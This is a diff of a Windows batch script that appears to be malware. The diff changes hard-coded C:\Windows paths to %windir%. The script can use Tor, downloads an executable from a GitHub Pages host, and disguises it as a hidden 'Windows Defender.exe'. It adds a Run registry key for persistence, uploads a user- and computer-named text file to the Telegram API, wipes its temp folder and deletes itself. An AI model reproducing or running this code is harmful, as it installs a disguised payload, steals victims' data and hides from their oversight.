@@ -10,9 +10,9 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
   set "proxy=--tlsv1"
 )
 
-attrib -s -h -i "C:\Windows\Windows Defender.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+attrib -s -h -i "%windir%\Windows Defender.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "%windir%\Windows Defender.exe" && attrib +s +h +i "%windir%\Windows Defender.exe"
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%windir%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
 mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"
 
@@ -78,6 +78,6 @@ curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegr
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
-"C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+"%windir%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 
 del /s /f /q /a "%~f0"
